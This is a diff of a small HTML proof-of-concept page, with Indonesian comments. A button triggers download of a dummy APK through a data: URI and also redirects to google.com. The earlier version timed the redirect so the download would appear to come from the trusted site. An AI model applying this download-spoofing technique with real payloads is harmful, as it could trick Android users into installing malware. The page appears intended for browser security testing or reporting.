@@ -2,25 +2,18 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Enhanced APK Download PoC</title>
+  <title>Android Download PoC</title>
 </head>
 <body>
 
-<h3>Enhanced APK Download PoC</h3>
-<button id="start">Start PoC</button>
+<h3>Download APK/EXE PoC Android</h3>
+<button id="start">Start</button>
 
 <script>
-document.getElementById('start').addEventListener('click', async () => {
+document.getElementById('start').addEventListener('click', () => {
   try {
-    console.log("PoC started from origin:", location.origin);
-
-    // 1. Redirect ke Google dulu
-    window.location.href = "https://www.google.com";
-
-    // 2. Tunggu beberapa detik sebelum trigger download
-    setTimeout(() => {
-      // 3. Konten dummy APK
-      const content = `
+    // Konten file dummy APK/EXE
+    const content = `
 PK
 Fake_APK_File
 AndroidManifest.xml
@@ -29,23 +22,26 @@ res/layout/activity_main.xml
 END_OF_FILE
 `;
 
-      const encoded = encodeURIComponent(content);
+    const encoded = encodeURIComponent(content);
 
-      // 4. Buat element <a> untuk download
-      const a = document.createElement('a');
-      a.href = 'data:application/vnd.android.package-archive,' + encoded;
-      a.download = 'test.apk';
+    // Buat element <a> untuk download
+    const a = document.createElement('a');
+    a.href = 'data:application/vnd.android.package-archive,' + encoded;
+    a.download = 'test.apk';
 
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
 
-      console.log("APK download triggered after redirect");
+    console.log("Download triggered reliably on Android");
 
-    }, 1500); // delay 1.5 detik agar halaman target muncul dulu
+    // Redirect setelah download
+    setTimeout(() => {
+      window.location.href = "https://google.com";
+    }, 500); // cukup delay kecil
 
-  } catch (e) {
-    console.error("Error in PoC:", e);
+  } catch(e) {
+    console.error("Error:", e);
   }
 });
 </script>
